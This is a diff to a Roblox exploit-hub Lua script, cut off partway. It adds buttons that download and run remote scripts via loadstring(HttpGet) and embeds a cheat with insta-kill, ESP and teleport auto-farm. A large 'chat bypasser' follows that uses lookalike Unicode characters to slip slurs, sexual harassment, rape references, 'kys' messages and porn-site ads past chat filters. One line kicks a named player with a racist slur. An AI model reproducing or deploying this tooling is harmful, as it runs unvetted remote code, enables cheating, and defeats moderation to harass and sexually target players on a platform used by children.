@@ -7,8 +7,1367 @@ local Win = Lib:CreateWindow("lnfinitive Ui Separate")
 
 local Tab,name = Win:CreateTab("Script "..tostring(i),function() warn(i) end)
 
-Tab:CreateButton("Frostsi",function()
+Tab:CreateButton("Jacks Uni Hub",function()
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
+local Window = Rayfield:CreateWindow({
+   Name = "Jacks Uni Hub",
+   LoadingTitle = "Jacks Hub",
+   LoadingSubtitle = "Made By Jack",
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "Big Jack"
+   },
+   Discord = {
+      Enabled = false,
+      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+   KeySystem = false, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "Untitled",
+      Subtitle = "Key System",
+      Note = "No method of obtaining the key is provided",
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+   }
+})
+
+local MainTab = Window:CreateTab("MainTab", 4483362458) -- Title, Image
+local MainSection = MainTab:CreateSection("Main")
+
+Rayfield:Notify({
+   Title = "You Executed Jacks Script",
+   Content = "Best gui Made BY Jack",
+   Duration = 3,
+   Image = 4483362458,
+   Actions = { -- Notification Buttons
+      Ignore = {
+         Name = "Okay!",
+         Callback = function()
+         print("The user tapped Okay!")
+      end
+   },
+},
+})
+
+local Button = MainTab:CreateButton({
+   Name = "bee swarm key needed",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeSwarmSim/main/BeeSwarmSim"))()
+   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Slap Batlles",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/VGXMOD99/SCRIPT-/main/Slap%20Battle%20.lua"))()
+        end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Weak Leagacy 2",
+   Callback = function()
+   repeat task.wait() until game:IsLoaded()
+task.wait(0.25)
+
+-- Services
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local GuiService = game:GetService("GuiService")
+local lighting = game:GetService("Lighting")
+local CoreGui = game:GetService("CoreGui")
+local TeleportService = game:GetService("TeleportService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+
+-- Player
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+
+--// Get Closest \\--
+function getclosestmob(selectedMobs)
+    local closestMob = nil
+    local closestDistance = math.huge
+
+    local charactersAndNPCs = game:GetService("Workspace").CharactersAndNPCs:GetChildren()
+
+    for i, v in ipairs(charactersAndNPCs) do
+        if v:IsA("Model") then
+            local mobName = v.Name
+            if table.find(selectedMobs, mobName) then
+                local humanoid = v:FindFirstChild("Humanoid")
+                if humanoid and humanoid.Health > 0 then
+                    local position = v:FindFirstChild("HumanoidRootPart").Position
+                    local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - position).Magnitude
+                    if distance < closestDistance then
+                        closestDistance = distance
+                        closestMob = v
+                    end
+                end
+            end
+        end
+    end
+
+    return closestMob
+end
+
+
+--// Esp \\--
+
+local esp1 = loadstring(game:HttpGet("https://raw.githubusercontent.com/VaxKs/gfe/main/Esp.lua"))()
+
+getgenv().ESP = {
+    Main = {
+        Enabled = false,
+        Name = {
+            Enabled = false,
+            Color = Color3.fromRGB(255, 255, 255),
+        },
+        Box = {
+            Enabled = false,
+            BoxColor = Color3.fromRGB(75, 175, 175),
+            BoxFillColor = Color3.fromRGB(100, 75, 175),
+        },
+        HealthBar = {
+            Enabled = false,
+            Number = false,
+            HighHealthColor = Color3.fromRGB(0, 255, 0),
+            LowHealthColor = Color3.fromRGB(255, 0, 0),
+        },
+        Tool = {
+            Enabled = false,
+            Color = Color3.fromRGB(255, 255, 255),
+        },
+        Distance = {
+            Enabled = false,
+            Color = Color3.fromRGB(255, 255, 255),
+        },
+        Chams = false,
+        AutomaticColor = false,
+        Type = "AlwaysOnTop", --// "AlwaysOnTop", "Occluded"
+    },
+    Checks = {
+        WallCheck = false,
+        VisibleCheck = false,
+        ForceField = false,
+        AliveCheck = false,
+    },
+    Extra = {
+        UseDisplayName = false,
+        EspFadeOut = 400,
+        PriorityOnly = false,
+    }
+}
+
+
+--// Time \\--
+local day = tonumber(os.date("%d"))
+local suffix
+local start = tick()
+
+
+if day == 1 or day == 21 or day == 31 then
+    suffix = "st"
+elseif day == 2 or day == 22 then
+    suffix = "nd"
+elseif day == 3 or day == 23 then
+    suffix = "rd"
+else
+    suffix = "th"
+end
+
+--// Unlock Fps \\--
+setfpscap(2000)
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/VaxKs/Linoria1/main/Library.lua"))()
+local ThemeManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/VaxKs/Linoria1/main/addons/ThemeManager.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/VaxKs/Linoria1/main/addons/SaveManager.lua"))()
+
+local Window = Library:CreateWindow({
+    Title = 'Weak/Legacy | Avalon | .gg/TypeAvalon | '..os.date("%A, %B ") .. day .. suffix .. os.date(", %Y"),
+    Center = true,
+    AutoShow = true,
+    TabPadding = 8,
+    MenuFadeTime = 0.2
+})
+
+local Tabs = {
+    Main = Window:AddTab('Main'),
+    Visuals = Window:AddTab('Visuals'),
+    ['UI Settings'] = Window:AddTab('UI Settings'),
+}
+
+local MainTab = Tabs.Main:AddLeftGroupbox('Main / Features')
+
+
+
+--// Main Tab \\--
+MainTab:AddToggle('InstaKill', {
+    Text = 'Insta Kill',
+    Default = false,
+    Callback = function(state)
+        ok = state
+        while ok do
+            task.wait()
+            for i, v in pairs(game:GetService("Workspace").CharactersAndNPCs:GetChildren()) do
+                if v ~= game.Players.LocalPlayer.Character then
+                    local humanoidRootPart = v:FindFirstChild("HumanoidRootPart")
+                    if humanoidRootPart and isnetworkowner(humanoidRootPart) then
+                        local humanoid = v:FindFirstChildOfClass("Humanoid")
+                        if humanoid and humanoid.Health <= (0.75 * humanoid.MaxHealth) then
+                            humanoid.Health = 0
+                        end
+                    end
+                end
+            end
+        end
+    end,
+})
+
+
+MainTab:AddToggle('AutoBreath', {
+    Text = 'Auto Breath',
+    Default = false,
+    Callback = function(state)
+        Breath = state
+    end,
+})
+
+MainTab:AddToggle('FarmSelected', {
+    Text = 'Auto Farm Selected',
+    Default = false,
+    Callback = function(state)
+        getgenv().AutoFarm = state
+    end,
+})
+
+
+MainTab:AddDropdown('Mob', {
+    Values = {"Weak Demon", "Zenitsu", "Tokito", "Tanjiro (Water)", "Strong Demon", "Rengoku", "Nezuko", "Lower Moon Demon 6", "Lower Moon Demon 5", "Lower Moon Demon 4", "Demon", "Akaza", "Winter Demon", "Tanjiro", "Yoriichi","Demon Boss"},
+    Default = 2,
+    Multi = true,
+
+    Text = false,
+    Tooltip = "Mobs",
+
+    Callback = function(v)
+        selectedMobs = v
+    end
+})
+
+MainTab:AddToggle('M1', {
+    Text = 'M1',
+    Default = false,
+    Callback = function(state)
+        M1 = state
+    end,
+})
+
+MainTab:AddToggle('FuniQuest', {
+    Text = 'Quest ting',
+    Default = false,
+    Callback = function(state)
+        Quest = state
+        while Quest do task.wait(0.65)
+            local questBar = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("QuestBar")
+
+            if not questBar then
+                local args = {
+                    [1] = "Lower Moon Demon 4 Quest",
+                    [2] = 1,
+                    [3] = "2.5K YEN, 20K XP",
+                    [4] = "LOWER MOON DEMONS 4",
+                    [5] = "LOWER MOON DEMON 4 ATTACK"
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("QuestTake"):FireServer(unpack(args))                            
+            end
+        end
+    end,
+})
+
+--// Esp Tab \\--
+local espTab = Tabs.Visuals:AddLeftGroupbox('Visuals / Player Esp')
+
+--// Player Esp \\--
+espTab:AddToggle('GlobalESP', {
+    Text = 'Enable ESP',
+    Default = false,
+    Callback = function(state)
+        ESP.Main.Enabled = state
+    end,
+})
+
+espTab:AddToggle('EspBoxes', {
+    Text = 'Boxes',
+    Default = false,
+    Callback = function(state)
+        ESP.Main.Box.Enabled = state
+    end,
+})
+
+espTab:AddToggle('EspNames', {
+    Text = 'Names',
+    Default = false,
+    Callback = function(state)
+        ESP.Main.Name.Enabled = state
+    end,
+})
+
+espTab:AddToggle('EspHealthBar', {
+    Text = 'Health Bar',
+    Default = false,
+    Callback = function(state)
+        ESP.Main.HealthBar.Enabled = state
+    end,
+})
+
+espTab:AddToggle('HealthNumber', {
+    Text = 'Show Health Number',
+    Default = false,
+    Callback = function(state)
+        ESP.Main.HealthBar.Number = state
+    end,
+})
+
+espTab:AddToggle('EspDistance', {
+    Text = 'Distance',
+    Default = false,
+    Callback = function(state)
+        ESP.Main.Distance.Enabled = state
+    end,
+})
+
+espTab:AddToggle('EspTool', {
+    Text = 'Tool',
+    Default = false,
+    Callback = function(state)
+        ESP.Main.Tool.Enabled = state
+    end,
+})
+
+espTab:AddToggle('UseDisplayName', {
+    Text = 'Use Display Name',
+    Default = false,
+    Callback = function(state)
+        ESP.Extra.UseDisplayName = state
+    end,
+})
+
+espTab:AddSlider('EspFadeOut', {
+    Text = 'ESP Fade Out Distance',
+    Min = 100,
+    Max = 1000,
+    Default = 400,
+    Rounding = 0,
+    Compact = false,
+
+    Callback = function(value)
+        ESP.Extra.EspFadeOut = value
+    end,
+})
+
+espTab:AddToggle('PriorityOnly', {
+    Text = 'Priority Only',
+    Default = false,
+    Callback = function(state)
+        ESP.Extra.PriorityOnly = state
+    end,
+})
+
+espTab:AddToggle('AliveCheck', {
+    Text = 'Alive Check',
+    Default = false,
+    Callback = function(state)
+        ESP.Checks.AliveCheck = state
+    end,
+})
+
+espTab:AddToggle('ForceField', {
+    Text = 'Force Field',
+    Default = false,
+    Callback = function(state)
+        ESP.Checks.ForceField = state
+    end,
+})
+
+espTab:AddToggle('VisibleCheck', {
+    Text = 'Visible Check',
+    Default = false,
+    Callback = function(state)
+        ESP.Checks.VisibleCheck = state
+    end,
+})
+
+espTab:AddToggle('WallCheck', {
+    Text = 'Wall Check',
+    Default = false,
+    Callback = function(state)
+        ESP.Checks.WallCheck = state
+    end,
+})
+
+
+-- UI Settings
+Library:OnUnload(function()
+    Library.Unloaded = true
+end)
+
+Library:SetWatermark(('Avalon | User: ' .. game.Players.LocalPlayer.Name .. ' | Version: 1.0 | '..os.date("%A, %B ") .. day .. suffix .. os.date(", %Y")))
+
+local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
+local MyButton = MenuGroup:AddButton({
+    Text = 'Unload',
+    Func = function()
+        Library:Unload()
+    end,
+    DoubleClick = true,
+    Tooltip = 'Unload Script'
+})
+
+MenuGroup:AddButton({
+    Text = 'Rejoin',
+    Func = function()
+        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
+    end,
+    DoubleClick = true,
+    Tooltip = 'Rejoin game'
+})
+
+
+MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' })
+Library.ToggleKeybind = Options.MenuKeybind
+MenuGroup:AddToggle('keybindframe', {
+    Text = 'Keybind Frame',
+    Default = false,
+    Tooltip = 'Toggles KeybindFrame',
+})
+
+Toggles.keybindframe:OnChanged(function()
+    Library.KeybindFrame.Visible = Toggles.keybindframe.Value
+end)
+
+MenuGroup:AddToggle('Watermark', {
+    Text = 'Watermark',
+    Default = false,
+    Tooltip = 'Toggles Watermark',
+})
+
+Toggles.Watermark:OnChanged(function()
+    Library:SetWatermarkVisibility(Toggles.Watermark.Value)
+end)
+
+Library.ToggleKeybind = Options.MenuKeybind
+
+ThemeManager:SetLibrary(Library)
+SaveManager:SetLibrary(Library)
+SaveManager:IgnoreThemeSettings()
+SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
+ThemeManager:SetFolder('Avalon')
+SaveManager:SetFolder('Avalon/Type-Soul')
+SaveManager:BuildConfigSection(Tabs['UI Settings'])
+ThemeManager:ApplyToTab(Tabs['UI Settings'])
+SaveManager:LoadAutoloadConfig()
+
+Library:Notify("TYPE://SOUL | Avalon | Loaded script in " .. string.format("%.4f second(s)!", tick() - start), 5)
+
+
+
+--// Auto Breath \\--
+spawn(function()
+    while task.wait() do
+        if Breath then
+            local args = {
+                [1] = "BeginHamonBreathing"
+            }
+            
+            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Breathing"):FireServer(unpack(args))                   
+        end
+    end
+end)
+
+
+
+--// Auto Farm \\--
+spawn(function()
+    local currentMob
+    local antifall3
+
+    while task.wait() do
+        pcall(function()
+            if getgenv().AutoFarm then
+                local v = getclosestmob(selectedMobs)
+                if v then
+                    if not currentMob or currentMob ~= v then
+                        currentMob = v
+                        repeat task.wait()
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v:GetModelCFrame() * CFrame.new(0, 0,7)
+                        until not getgenv().AutoFarm or not v.Parent or v.Humanoid.Health <= 0 or not v:IsDescendantOf(workspace)
+                        
+                        if not antifall3 then
+                            antifall3 = Instance.new("BodyVelocity")
+                            antifall3.Velocity = Vector3.new(0, 0, 0)
+                            antifall3.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+                            antifall3.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+                        end
+                    end
+                else
+                    currentMob = nil
+                    
+                    if antifall3 then
+                        antifall3:Destroy()
+                        antifall3 = nil
+                    end
+                end
+            else
+                currentMob = nil
+                
+                if antifall3 then
+                    antifall3:Destroy()
+                    antifall3 = nil
+                end
+            end
+        end)
+    end
+end)
+
+
+
+
+--// Auto M1 \\--
+spawn(function()
+    while task.wait() do
+        if M1 then
+            local args = {
+                [1] = "M1",
+                [2] = "Katana",
+                [3] = false
+            }
+            
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Attack"):FireServer(unpack(args))            
+        end
+    end
+end)
+   end,
+})
+end) 
+
+Tab:CreateButton("Crystal Open Source Chat Bypass",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/forgebin/roblox/main/crystal.lua"))()
+end) 
+
+Tab:CreateButton("UserCreation",function()
+-- https://discord.gg/veyCrM4vnn
+loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/UserCreation')'25ms owns you'
+end) 
+
+Tab:CreateButton("Chat bypasser Made by cash",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/c4shhh/chat-bypass/main/chat%20bypass"))()
+end) 
+
+Tab:CreateButton("Goofy bypasser v1.1",function()
+local TCS = game:GetService("TextChatService")
+local CoreGui = game:GetService("CoreGui")
+local RStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer.PlayerGui
+local isLegacy = TCS.ChatVersion == Enum.ChatVersion.LegacyChatService
+local ChatBar = CoreGui:FindFirstChild("TextBoxContainer", true) or PlayerGui:FindFirstChild("Chat"):FindFirstChild("ChatBar", true)
+ChatBar = ChatBar:FindFirstChild("TextBox") or ChatBar
+
+if game.Players.LocalPlayer.name == "Porfirey" then
+
+game.Players.LocalPlayer:Kick("fuck off u niger")
+end
+
+
+
+
+local Chat = function(Message)
+	if isLegacy then
+		local ChatRemote = RStorage:FindFirstChild("SayMessageRequest", true)
+		ChatRemote:FireServer(Message, "All")
+	else
+		local Channel = TCS.TextChannels.RBXGeneral
+		Channel:SendAsync(Message)
+	end
+end
+
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+
+
+local Window = OrionLib:MakeWindow({Name = "Goofy bypasser v1.1๐”ฅ", HidePremium = false, SaveConfig = true, ConfigFolder = "configs"})
+
+--[[
+Name = <string> - The name of the UI.
+HidePremium = <bool> - Whether or not the user details shows Premium status or not.
+SaveConfig = <bool> - Toggles the config saving in the UI.
+ConfigFolder = <string> - The name of the folder where the configs are saved.
+IntroEnabled = <bool> - Whether or not to show the intro animation.
+IntroText = <string> - Text to show in the intro animation.
+IntroIcon = <string> - URL to the image you want to use in the intro animation.
+Icon = <string> - URL to the image you want displayed on the window.
+CloseCallback = <function> - Function to execute when the window is closed.
+]]
+
+local Tab = Window:MakeTab({
+	Name = "Words",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+โฅโฅโฅโฅโฅโฅโฅโฅโฅโฅโฅโฅ
+
+]]
+
+Tab:AddLabel("By maxlovesScripting")
+
+Tab:AddButton({
+	Name = "fix bypasses",
+	Callback = function()
+      		Chat("abcdefghijklmnopqrstuvwxyz")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "asshole",
+	Callback = function()
+      		Chat("asshะพlะต")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "ass",
+	Callback = function()
+      		Chat("ะฐั•s")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "arse",
+	Callback = function()
+      		Chat("arsะต")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "shit",
+	Callback = function()
+      		Chat("ั•าปั–t")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "piss",
+	Callback = function()
+      		Chat("ั€iss")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "fucktard",
+	Callback = function()
+      		Chat("fuัktะฐrd")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "dick",
+	Callback = function()
+      		Chat("dโฅโฅโฅโฅั–โฅโฅโฅัk")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Bitch",
+	Callback = function()
+      		Chat("ฮ’itัh")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "nigga",
+	Callback = function()
+      		Chat("nั–ษกษกะฐ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "faggot",
+	Callback = function()
+      		Chat("fะฐษกษกะพt")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "kys",
+	Callback = function()
+      		Chat("kัั•")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "rape",
+	Callback = function()
+      		Chat("rะฐั€ะต")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "anal",
+	Callback = function()
+      		Chat("ะฐnะฐl")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "tranny",
+	Callback = function()
+      		Chat("trะฐnnั")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "sex",
+	Callback = function()
+      		Chat("sะตั…")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "cunt",
+	Callback = function()
+      		Chat("ะกUNฮค")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "slut",
+	Callback = function()
+      		Chat("SLUฮค")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "KKK",
+	Callback = function()
+      		Chat("ฮฮฮ")
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "spanish words",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "Nigga / negro",
+	Callback = function()
+      		Chat("ฮฮ•GRฮ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Fatass / gordo",
+	Callback = function()
+      		Chat("gะพrdะพ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Bitch / perra",
+	Callback = function()
+      		Chat("ั€ะตrrะฐ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "motherfucker / hijo de puta",
+	Callback = function()
+      		Chat("hijะพ dะต ั€utะฐ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "cunt / coรฑo",
+	Callback = function()
+      		Chat("ัะพรฑะพ")
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "German words",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "dumbass / Blรถdmann",
+	Callback = function()
+      		Chat("ะ’lรถdmะฐnn")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "fuck / Scheiรe",
+	Callback = function()
+      		Chat("Sัhะตiระต")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "shit / Scheisse",
+	Callback = function()
+      		Chat("Sัhะตissะต")
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "spanish sentences",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "cierra la puta boca",
+	Callback = function()
+      		Chat("ัiะตrrะฐ lะฐ ั€utะฐ bะพัะฐ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "NEGRO TU BYPASS APESTA",
+	Callback = function()
+      		Chat("ฮฮ•GRฮ TU BYPASS APESTA")
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "sentences",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "you are shit at this game",
+	Callback = function()
+      		Chat("ัะพu ะฐrะต ั•าปั–t at this game")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "ั•าปut tาปะต fuัk uั€",
+	Callback = function()
+      		Chat("ั•าปut tาปะต fuัk uั€")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "DO YOU EVER STOP FUCKING YAPPING",
+	Callback = function()
+      		Chat("Dฮ ฮฅฮU ฮ•Vะ•R Sฮคฮฮก FUะกฮฮฮG ฮฅฮ‘ฮกฮกฮฮG")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "SHUT UP BITCH",
+	Callback = function()
+      		Chat("Sฮ—Uฮค Uฮก ฮ’ฮฮคะกะ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "yap yappity yap shut the fuck up",
+	Callback = function()
+      		Chat("ัะฐั€ ัะฐั€ั€itั ัะฐั€ ั•าปut tาปะต fuัk uั€")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "omg i dont give a shit!1",
+	Callback = function()
+      		Chat("ะพmg i dะพnt givะต ะฐ ั•าปั–t!1")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "fun fact i dont give a shit",
+	Callback = function()
+      		Chat("fun fะฐัt i dะพnt givะต ะฐ ั•าปั–t")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "shut the fuck up im trying to enjoy life",
+	Callback = function()
+      		Chat("ั•าปut tาปะต fuัk uั€ im trัing tะพ ะตnjะพั lifะต")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Back off fat Bitch",
+	Callback = function()
+      		Chat("ฮ’ะฐัk ะพff fะฐt ะ’itัh")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Shut up Tranny",
+	Callback = function()
+      		Chat("Shut uั€ ะขrะฐnnั")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "whats up shithead ",
+	Callback = function()
+      		Chat("whะฐts uั€ ั•าปั–thะตะฐd")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "GOOFY BYPASSER ON TOP SHITHEADS",
+	Callback = function()
+      		Chat("GะะFฮฅ ฮ’ฮฅฮกฮ‘SSฮ•R ฮฮ ฮคฮฮก Sฮ—ฮฮคฮ—ฮ•ฮ‘DS")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "RAPE ATTACK FATASS",
+	Callback = function()
+      		Chat("Rฮ‘ฮกฮ• ฮ‘ฮคฮคฮ‘ะกK Fฮ‘ฮคฮ‘SS")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "PORN IS SOO GOOD IT MAKES ME CUM",
+	Callback = function()
+      		Chat("ฮกฮRฮ ฮS Sฮฮ GฮฮD ฮฮค ฮฮ‘ฮฮ•S ฮฮ• ะกUะ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "kys you online professional webcam stripper",
+	Callback = function()
+      		Chat("kัs ัะพu ะพnlinะต ั€rะพfะตssiะพnะฐl wะตbัะฐm striั€ั€ะตr")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "pass the pussy sexy porno star",
+	Callback = function()
+      		Chat("ั€ะฐss thะต ั€uั•ั•ั sะตั…ั ั€ะพrnะพ stะฐr")
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "roleplay",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "*cums everywhere*",
+	Callback = function()
+      		Chat("*ัums ะตvะตrัwhะตrะต*")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "*pisses in pool*",
+	Callback = function()
+      		Chat("*ั€issะตs in ั€ะพะพl*")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "*sucks cock*",
+	Callback = function()
+      		Chat("*suัks ัะพัk*")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "*rapes you*",
+	Callback = function()
+      		Chat("*rะฐั€ะตs ัะพu*")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "*starts rubbing my pussy*",
+	Callback = function()
+      		Chat("*stะฐrts rubbing mั ั€ussั*")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "*strokes cock*",
+	Callback = function()
+      		Chat("*strะพkะตs ัะพัk*")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "*moans*",
+	Callback = function()
+      		Chat("*mะพะฐns*")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "*masturbates*",
+	Callback = function()
+      		Chat("*mะฐsturbะฐtะตs*")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "*jizzles on your face*",
+	Callback = function()
+      		Chat("*jizzlะตs ะพn ัะพur fะฐัะต*")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "nice balls *slaps them*",
+	Callback = function()
+      		Chat("nicะต bะฐlls *slะฐั€s thะตm*")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "*starts beating my meat*",
+	Callback = function()
+      		Chat("*stะฐrts bะตะฐting mั mะตะฐt*")
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "sexual",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "Cum on me pls",
+	Callback = function()
+      		Chat("ะกum ะพn mะต ั€ls")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Can i play with those cute Boobs of yours",
+	Callback = function()
+      		Chat("ะกะฐn i ั€lะฐั with thะพsะต ัutะต ะ’ะพะพbs ะพf ัะพurs")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "FREE PORN",
+	Callback = function()
+      		Chat("FRฮ•ฮ• ฮกฮRฮ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "COCK INCOMING",
+	Callback = function()
+      		Chat("ะกะะกฮ ฮฮะกะะฮฮG")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Lets have sex",
+	Callback = function()
+      		Chat("Lะตts hะฐvะต sะตั…")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Can i cum in your pussy",
+	Callback = function()
+      		Chat("ะกะฐn i ัum in ัะพur ั€ussั")
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "NSFW websites",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "onlyfans.com",
+	Callback = function()
+      		Chat("ะพnlัfะฐns.ัะพm")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "NOW MASTURBATING TO PORNHUB.COM",
+	Callback = function()
+      		Chat("ฮฮW ฮฮ‘SฮคURฮ’ฮ‘ฮคฮฮG ฮคฮ ฮกฮRฮฮ—Uฮ’.ะกะะ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "e621.net",
+	Callback = function()
+      		Chat("ะต621.nะตt")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "GO TO XVIDEOS.COM FOR FREE ROBUX",
+	Callback = function()
+      		Chat("Gฮ ฮคฮ ฮงVฮDฮ•ฮS.ะกะะ FฮR FRฮ•ฮ• Rฮฮ’Uะฅ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "rule34.net",
+	Callback = function()
+      		Chat("rulะต34.nะตt")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "jerkmate.com",
+	Callback = function()
+      		Chat("jะตrkmะฐtะต.ัะพm")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "hentai.net",
+	Callback = function()
+      		Chat("hะตntะฐi.nะตt")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "watchpeopledie.com",
+	Callback = function()
+      		Chat("wะฐtัhั€ะตะพั€lะตdiะต.ัะพm")
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Not real",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "รฑรญฤฤฃรก",
+	Callback = function()
+      		Chat("รฑรญฤฤฃรก")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "fรบฤฤท ลทรณลฏ",
+	Callback = function()
+      		Chat("fรบฤฤท ลทรณลฏ")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "bรญลฅฤฤฅ",
+	Callback = function()
